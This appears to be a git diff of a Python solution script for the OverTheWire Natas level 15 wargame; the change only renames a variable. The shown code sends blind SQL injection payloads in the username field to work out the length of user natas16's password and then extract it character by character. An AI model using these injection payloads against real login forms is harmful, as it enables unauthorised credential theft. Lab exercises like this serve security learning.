@@ -11,17 +11,17 @@ url="http://natas15.natas.labs.overthewire.org/index.php"
 
 headers = {"Authorization" : sys.argv[1]}
 
-# Find the length of the password attribute of user natas16
-attribute_len = 1;
+# Find the length of the password of user natas16
+password_len = 1;
 while True:
-    data = {"username": "natas16\" and char_length(password) = {}-- ".format(attribute_len)}
+    data = {"username": "natas16\" and char_length(password) = {}-- ".format(password_len)}
     resp = sess.post(url, data=data, params={"debug":"true"}, headers=headers)
     #print(resp.text)
     if "This user exists." in resp.text:
         break
-    attribute_len += 1
+    password_len += 1
 
-print("Password attribute length", attribute_len)
+print("Password length", password_len)
 
 # Find the characters in the password of user natas16
 characters=[]
@@ -38,7 +38,7 @@ print("Characters in the password", characters)
 
 # Find the password for user natas16
 password = "" 
-for i in range(1, attribute_len+1, 1): # substr(password, 0, 1) returns empty string
+for i in range(1, password_len+1, 1): # substr(password, 0, 1) returns empty string
     #print(f"Checking pos {i}")
     for c in characters:
         data = {"username": "natas16\" and substr(password, {}, 1) = BINARY \"{}\"-- ".format(i, c)}
